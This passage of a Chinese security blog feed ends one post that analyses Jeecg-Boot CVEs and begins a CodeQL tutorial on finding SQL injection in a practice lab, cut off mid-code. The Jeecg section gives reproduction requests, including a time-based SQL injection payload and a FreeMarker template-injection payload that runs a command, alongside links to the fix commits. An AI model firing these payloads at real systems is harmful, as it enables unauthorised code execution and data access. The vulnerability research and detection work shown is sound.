class="language-xquery"></span></span><br><span class="line"><span class="language-xquery">excel_online</span></span><br><span class="line"><span class="language-xquery">------WebKitFormBoundaryBB3U3apXylvyidXI--</span></span><br><span class="line"><span class="language-xquery"></span></span><br></pre></td></tr></table></figure><p>文件上传不需要 token 验证，访问需要 token 验证。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/jeecg-boot/jimureport/xss1695174346254.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Microsoft Edge&quot;;v=&quot;117&quot;, &quot;Not;A=Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;117&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.31</span><br><span class="line"><span class="attribute">X-Access-Token</span><span class="punctuation">: </span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTUxNzc2MjUsInVzZXJuYW1lIjoiYWRtaW4ifQ.ESuinsQxPdrLjOSt_aOhqx3DR35LSL_vIsfv_dmD_og</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,ja;q=0.5,zh-TW;q=0.4,no;q=0.3,ko;q=0.2</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上传的文件甚至可以访问</p><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>对应的类处理 <code>org.jeecg.modules.jmreport.desreport.a.a</code> 类的 <code>upload</code> 接口。拿到 HTTP 请求当中文件上传请求的参数，往下走，进入 <code>local</code></p><p>下面就是文件上传的部分了，其实并没有做任何过滤。只是把 <code>../</code> 过滤了</p><h3 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>把 jimuReport 的版本升级到 1.6.1 +，最新的 diff 并没有找到，后续值得分析。</p><h2 id="CVE-2023-38905-Jeecg-Boot-lt-x3D-3-5-1-SQL-注入"><a href="#CVE-2023-38905-Jeecg-Boot-lt-x3D-3-5-1-SQL-注入" class="headerlink" title="CVE-2023-38905 Jeecg-Boot &lt;&#x3D; 3.5.1 SQL 注入"></a>CVE-2023-38905 Jeecg-Boot &lt;&#x3D; 3.5.1 SQL 注入</h2><ul><li>不得不提一嘴，SQL 注入真的太多了。</li></ul><h3 id="漏洞描述-4"><a href="#漏洞描述-4" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>/sys/duplicate/check</code> 接口 SQL 注入，<code>checksql</code> 可以被绕过。</p><h3 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/jeecg-boot/sys/duplicate/check?tableName=v3_hello&amp;fieldName=1+and%09if(user(%20)=&#x27;root@localhost&#x27;,sleep(0),sleep(5))&amp;fieldVal=1&amp;dataId=asd</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line">X_ACCESS_TOKEN: eyJ0eXAi0iJKV1QiLCJhbGci0iJIUzI1Ni J9.eyJleHAi0jE2NzA2NjUy0TQsInVzZXJ uYW1lIjoiYWRtaW4i fQ.bL0e7k3rbFEewdMoL2YfPCo9rtzx7g9 KLjB2LK-J9SU</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>本质上来说也是黑名单绕过</p><h3 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a class="link" href="https://github.com/jeecgboot/jeecg-boot/commit/44952c79c244a998e3904e44cea47baab0ee681b">https://github.com/jeecgboot/jeecg-boot/commit/44952c79c244a998e3904e44cea47baab0ee681b<i class="fas fa-external-link-alt"></i></a></p><p>SQL 注入基本上都是在做黑名单的 bypass，分析 SQL 注入就分析到这里。</p><h2 id="CVE-2023-4450-Jeecg-Boot-lt-x3D-3-5-3-存在-FreeMarker-模板引擎注入"><a href="#CVE-2023-4450-Jeecg-Boot-lt-x3D-3-5-3-存在-FreeMarker-模板引擎注入" class="headerlink" title="CVE-2023-4450 Jeecg-Boot &lt;&#x3D; 3.5.3 存在 FreeMarker 模板引擎注入"></a>CVE-2023-4450 Jeecg-Boot &lt;&#x3D; 3.5.3 存在 FreeMarker 模板引擎注入</h2><h3 id="漏洞描述-5"><a href="#漏洞描述-5" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>JeecgBoot 受影响版本中由于积木报表 <code>/jeecg-boot/jmreport/queryFieldBySql</code> Api 接口未进行身份校验，使用 Freemarker 处理用户用户传入的 sql 参数，未经授权的攻击者可发送包含恶意 sql 参数的 http 请求，通过 SSTI 在应用端执行任意代码。</p><h3 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jeecgboot/jmreport/queryFieldBySql</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:3100</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.20.10.2:3100/login?redirect=/dashboard/analysis</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>103</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql">&#123;&quot;sql&quot;:&quot;sekect &#x27;result:&lt;#assign ex=\&quot;freemarker.<span class="keyword">template</span>.utility.<span class="keyword">Execute</span>\&quot;?new()&gt;$&#123;ex(\&quot;calc\&quot;)&#125;&#x27;&quot;</span></span><br><span class="line"><span class="language-pgsql">&#125;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure><p>postman 发包</p><h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>入口对应 <code>org.jeecg.modules.jmreport.desreport.a.a#c()</code> 方法，先过了 sql 的黑名单，随后调用 <code>this.reportDbService.parseReportSql()</code> 方法。</p><p>跟进去是调用了动态代理，代理了 <code>target</code> 对象的 <code>method</code> 方法,并在执行该方法时传入 <code>argsToUse</code>参数，动调能够看到调用的是  <code>org.jeecg.modules.jmreport.desreport.service.a.i#parseReportSql</code> 方法。一路调用后来到 <code>org.jeecg.modules.jmreport.desreport.util.e#a</code> 方法；其中调用了 <code>FreeMarkerUtils.a()</code></p><p>跟进之后发现从这里开始新建了一个 Template，并加工表达式。后面就是 FreeMarker 执行表达式的过程了，这里不再赘述。</p><h3 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a class="link" href="https://github.com/jeecgboot/jeecg-boot/commit/baf4b96b3fcffa183e19b87485f5fb8388bb36ae">https://github.com/jeecgboot/jeecg-boot/commit/baf4b96b3fcffa183e19b87485f5fb8388bb36ae<i class="fas fa-external-link-alt"></i></a></p><p><a class="link" href="https://github.com/jeecgboot/jeecg-boot/commit/acb48179ab00e167747fa4a3e4fd3b94c78aeda5">https://github.com/jeecgboot/jeecg-boot/commit/acb48179ab00e167747fa4a3e4fd3b94c78aeda5<i class="fas fa-external-link-alt"></i></a></p><p>看着没啥问题，是完整的修复。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Jeecg-Boot 部分历史漏洞分析&lt;/p&gt;</summary>
    
    
    
    <category term="代码审计" scheme="https://drun1baby.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
    <category term="代码审计" scheme="https://drun1baby.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL 入门</title>
    <link href="https://drun1baby.github.io/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/"/>
    <id>https://drun1baby.github.io/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/</id>
    <published>2023-09-03T13:30:21.000Z</published>
    <updated>2023-09-18T01:07:10.579Z</updated>
    
    <content type="html"><![CDATA[<p>CodeQL · 真入门</p><span id="more"></span><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>在自己第一遍学完 CodeQL 之后还是感觉比较生疏，于是想找点靶场练手，于是就有了这篇文章。</p><h2 id="0x02-CodeQL-基本语法"><a href="#0x02-CodeQL-基本语法" class="headerlink" title="0x02 CodeQL 基本语法"></a>0x02 CodeQL 基本语法</h2><h3 id="QL-语法"><a href="#QL-语法" class="headerlink" title="QL 语法"></a>QL 语法</h3><p>用的是这个靶场 —— <a class="link" href="https://github.com/l4yn3/micro_service_seclab/">micro_service_seclab:<i class="fas fa-external-link-alt"></i></a>，同理其实 JoyChou93 师傅之前所设计的靶场，也是可以用来做 CodeQL 练习的。</p><ul><li>添加对应 database</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create E:\Coding\CodeQL\CodeQL-Practice --language=<span class="string">&quot;java&quot;</span> --source-root=E:\Coding\CodeQL\micro_service_seclab --<span class="built_in">command</span>=<span class="string">&quot;mvn clean package -Dmaven.test.skip=true&quot;</span></span><br></pre></td></tr></table></figure><p>CodeQL的核心引擎是不开源的，这个核心引擎的作用之一是帮助我们把micro-service-seclab转换成CodeQL能识别的中间层数据库。</p><p>然后我们需要编写QL查询语句来获取我们想要的数据。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/codeqlRunningProces.png" class><p>正如这张图描述的，由于CodeQL开源了所有的规则和规则库部分，所以我们能够做的就是编写符合我们业务逻辑的QL规则，然后使用CodeQL引擎去跑我们的规则，发现靶场的安全漏洞。</p><p>我们来简单地介绍一下本案例涉及到的CodeQL的基本语法。</p><p>基本语法包含3个部分。</p><table class="editor-table-container"><thead><tr><th>名称</th><th>解释</th></tr></thead><tbody><tr><td>Method</td><td>方法类，Method method 表示获取当前项目中所有的方法</td></tr><tr><td>MethodAccess</td><td>方法调用类，MethodAccess call 表示获取当前项目当中的所有方法调用</td></tr><tr><td>Parameter</td><td>参数类，Parameter 表示获取当前项目当中所有的参数</td></tr></tbody></table><p>结合 ql 的语法，我们尝试获取 <code>micro-service-seclab</code> 项目当中定义的所有方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">from Method method</span><br><span class="line">select method</span><br></pre></td></tr></table></figure><p>我们再通过 Method 类内置的一些方法，把结果过滤一下。比如我们获取名字为 <code>getStudent</code> 的方法名称。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">from Method method</span><br><span class="line">where method.hasName(&quot;getStudent&quot;)</span><br><span class="line">select method.getName(), method.getDeclaringType()</span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/getLimitedMethod.png" class><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">method.getName() <span class="comment">// 获取的是当前方法的名称</span></span><br><span class="line">method.getDeclaringType() / 获取的是当前方法所属class的名称。</span><br></pre></td></tr></table></figure><h3 id="谓词"><a href="#谓词" class="headerlink" title="谓词"></a>谓词</h3><p>和SQL一样，where部分的查询条件如果过长，会显得很乱。CodeQL提供一种机制可以让你把很长的查询语句封装成函数。</p><p>这个函数，就叫谓词。</p><p>比如上面的案例，我们可以写成如下，获得的结果跟上面是一样的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">predicate isStudent(Method method) &#123;</span><br><span class="line">exists(|method.hasName(&quot;getStudent&quot;))</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">from Method method</span><br><span class="line">where isStudent(method)</span><br><span class="line">select method.getName(), method.getDeclaringType()</span><br></pre></td></tr></table></figure><blockquote><p>语法解释</p></blockquote><p><code>predicate</code> 表示当前方法没有返回值。<br><code>exists</code> 子查询，是CodeQL谓词语法里非常常见的语法结构，它根据内部的子查询返回 <code>true or false</code>，来决定筛选出哪些数据。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/predicate.png" class><h3 id="设置-Source-和-Sink"><a href="#设置-Source-和-Sink" class="headerlink" title="设置 Source 和 Sink"></a>设置 Source 和 Sink</h3><p>什么是source和sink</p><p>在代码自动化安全审计的理论当中，有一个最核心的三元组概念，就是(source，sink和sanitizer)。</p><p>source 是指漏洞污染链条的输入点。比如获取http请求的参数部分，就是非常明显的Source。</p><p>sink 是指漏洞污染链条的执行点，比如SQL注入漏洞，最终执行SQL语句的函数就是sink(这个函数可能叫query或者exeSql，或者其它)。</p><p>sanitizer又叫净化函数，是指在整个的漏洞链条当中，如果存在一个方法阻断了整个传递链，那么这个方法就叫sanitizer。</p><p>只有当source和sink同时存在，并且从source到sink的链路是通的，才表示当前漏洞是存在的。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/sourceToSink.png" class><ul><li>设置 Source</li></ul><p>在 micro_service_seclab 中，对应的 Source 举个例子，SQL 注入的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/one&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> List&lt;Student&gt; <span class="title function_">one</span><span class="params">(<span class="meta">@RequestParam(value = &quot;username&quot;)</span> String username)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> indexLogic.getStudent(username);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应 CodeQL 当中的 Source</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;</span><br></pre></td></tr></table></figure><p><code>RemoteFlowSource</code> 类（在<code>semmle.code.java.dataflow.FlowSources</code>）中定义）表示可能由远程用户控制的数据流源，这里这段代码的传参比较简单，但其实传参如果复杂，比如是一个类的情况下，也是类似的</p><p>在下面的代码中，source就是<code>Student user</code>(user为Student类型，这个不受影响)。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(value = &quot;/object&quot;)</span></span><br><span class="line"><span class="keyword">public</span> List&lt;Student&gt; <span class="title function_">objectParam</span><span class="params">(<span class="meta">@RequestBody</span> Student user)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> indexLogic.getStudent(user.getUsername());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>设置 Sink</li></ul><p>在本案例中，我们的sink应该为<code>query</code>方法(Method)的调用(MethodAccess)，所以我们设置Sink为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">override predicate <span class="title function_">isSink</span><span class="params">(DataFlow::Node sink)</span> &#123;</span><br><span class="line">exists(Method method, MethodAccess call |</span><br><span class="line">  method.hasName(<span class="string">&quot;query&quot;</span>)</span><br><span class="line">  and</span><br><span class="line">  call.getMethod() = method and</span><br><span class="line">  sink.asExpr() = call.getArgument(<span class="number">0</span>)</span><br><span class="line">)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注：以上代码使用了exists子查询语法，格式为exists(Obj obj| somthing), 上面查询的意思为：查找一个query()方法的调用点，并把它的第一个参数设置为sink。 </p><p>在靶场系统(<code>micro-service-seclab</code>)中，sink就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbcTemplate.query(sql, ROW_MAPPER);</span><br></pre></td></tr></table></figure><p>因为我们测试的注入漏洞，当source变量流入这个方法的时候，才会发生注入漏洞！</p><h3 id="Flow数据流"><a href="#Flow数据流" class="headerlink" title="Flow数据流"></a>Flow数据流</h3><p>在设置完 Source 和 Sink 之后，我们需要确认 Source 到 Sink 是能够走通的，这一段的连通工作就是 CodeQL 引擎本身来完成的。我们通过 <code>config.hasFlowPath(source, sink)</code> 方法来判断是否连通。</p><p>比如如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><p>我们传递给 <code>config.hasFlowPath(source, sink)</code> 我们定义好的source和sink，系统就会自动帮我们判断是否存在漏洞了。</p><h2 id="0x03-CodeQL-语句优化"><a href="#0x03-CodeQL-语句优化" class="headerlink" title="0x03 CodeQL 语句优化"></a>0x03 CodeQL 语句优化</h2><h3 id="初步成果"><a href="#初步成果" class="headerlink" title="初步成果"></a>初步成果</h3><p>经过整理之后的 ql 查询代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @id java/examples/vuldemo</span><br><span class="line"> * @name Sql-Injection</span><br><span class="line"> * @description Sql-Injection</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import semmle.code.java.security.QueryInjection</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">     VulConfig() &#123; this = &quot;SqlInjectionConfig&quot;&#125;</span><br><span class="line">    </span><br><span class="line">    override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">        src instanceof RemoteFlowSource</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        exists(Method method, MethodAccess call |</span><br><span class="line">            method.hasName(&quot;query&quot;)</span><br><span class="line">            and</span><br><span class="line">            call.getMethod() = method and</span><br><span class="line">            sink.asExpr() = call.getArgument(0)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/Result.png" class><p>CodeQL 在定义类上的语法和 Java 类似，其中 extends 的父类 <code>TaintTracking::Configuration</code> 是官方提供用来做数据流分析的通用类，提供很多数据流分析相关的方法，比如isSource(定义source)，isSink(定义sink)</p><p><code>src instanceof RemoteFlowSource</code> 表示src 必须是 RemoteFlowSource 类型。在RemoteFlowSource里，官方提供很非常全的source定义，我们本次用到的Springboot的Source就已经涵盖了。</p><ul><li>注：上面的注释和其它语言是不一样的，不能够删除，它是程序的一部分，因为在我们生成测试报告的时候，上面注释当中的name，description等信息会写入到审计报告中。</li></ul><h3 id="误报解决"><a href="#误报解决" class="headerlink" title="误报解决"></a>误报解决</h3><p>扫描结果当中存在一项误报</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/wubao.png" class><p>这个方法的参数类型是 <code>List&lt;Long&gt;</code>，不可能存在注入漏洞。</p><p>这说明我们的规则里，对于 <code>List&lt;Long&gt;</code> ，甚至 <code>List&lt;Integer&gt;</code> 类型都会产生误报，source 误把这种类型的参数涵盖了。</p><p>我们需要采取手段消除这种误报。</p><p>这个手段就是 <code>isSanitizer</code>。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/isSanitizer.png" class><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">isSanitizer是CodeQL的类TaintTracking::Configuration提供的净化方法。它的函数原型是：</span><br><span class="line"></span><br><span class="line">override predicate isSanitizer(DataFlow::Node node) &#123;&#125;</span><br><span class="line"></span><br><span class="line">在CodeQL自带的默认规则里，对当前节点是否为基础类型做了判断。</span><br><span class="line"></span><br><span class="line">override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">node.getType() instanceof PrimitiveType or</span><br><span class="line">node.getType() instanceof BoxedType or</span><br><span class="line">node.getType() instanceof NumberType</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">表示如果当前节点是上面提到的基础类型，那么此污染链将被净化阻断，漏洞将不存在。</span><br></pre></td></tr></table></figure><p>由于 CodeQL 检测SQL注入里的 <code>isSanitizer</code> 方法，只对基础类型做了判断，并没有对这种复合类型做判断，才引起了这次误报问题。</p><p>那我们只需要将这种复合类型加入到 <code>isSanitizer</code> 方法，即可消除这种误报。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">    node.getType() instanceof PrimitiveType or</span><br><span class="line">    node.getType() instanceof BoxedType or</span><br><span class="line">    node.getType() instanceof NumberType or</span><br><span class="line">    exists(ParameterizedType pt| node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType )  // 这里的 ParameterizedType 代表所有泛型，判断泛型当中的传参是否为 Number 型</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>以上代码的意思为：如果当前node节点的类型为基础类型，数字类型和泛型数字类型(比如List)时，就切断数据流，认为数据流断掉了，不会继续往下检测。  </p><p>重新执行query，我们发现，刚才那条误报已经被成功消除啦。</p><h3 id="漏报解决"><a href="#漏报解决" class="headerlink" title="漏报解决"></a>漏报解决</h3><p>我们发现，如下的SQL注入并没有被CodeQL捕捉到。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Student&gt; <span class="title function_">getStudentWithOptional</span><span class="params">(Optional&lt;String&gt; username)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sqlWithOptional</span> <span class="operator">=</span> <span class="string">&quot;select * from students where username like &#x27;%&quot;</span> + username.get() + <span class="string">&quot;%&#x27;&quot;</span>;</span><br><span class="line">        <span class="comment">//String sql = &quot;select * from students where username like ?&quot;;</span></span><br><span class="line">        <span class="keyword">return</span> jdbcTemplate.query(sqlWithOptional, ROW_MAPPER);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>漏报理论上讲是不能接受的。如果出现误报我们还可以通过人工筛选来解决，但是漏报会导致很多漏洞流经下一个环节到线上，从而产生损失。</p><p>那我们如果通过CodeQL来解决漏报问题呢？答案就是通过 <code>isAdditionalTaintStep</code> 方法。</p><p>实现原理就一句话：<strong>断了就强制给它接上。</strong></p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/isAdditionalTaintStep.png" class><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span 